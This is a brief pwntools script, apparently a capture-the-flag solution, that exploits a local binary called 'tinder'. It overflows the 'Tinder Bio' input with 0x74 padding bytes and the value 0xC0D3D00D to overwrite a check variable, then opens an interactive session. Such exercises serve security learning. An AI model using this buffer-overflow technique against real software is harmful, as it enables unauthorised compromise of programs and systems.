from pwn import *

r = process('./tinder')
raw_input('debug')

r.sendafter('Name: ', 'a'*16)
r.send('\n')

r.sendlineafter('Username: ', 'linh')
r.sendlineafter('Password: ', 'pass')

buf = 'd'*0x74 + p32(0xC0D3D00D)
r.sendlineafter('Tinder Bio: ', buf)

r.interactive()
r.close()

# FLAG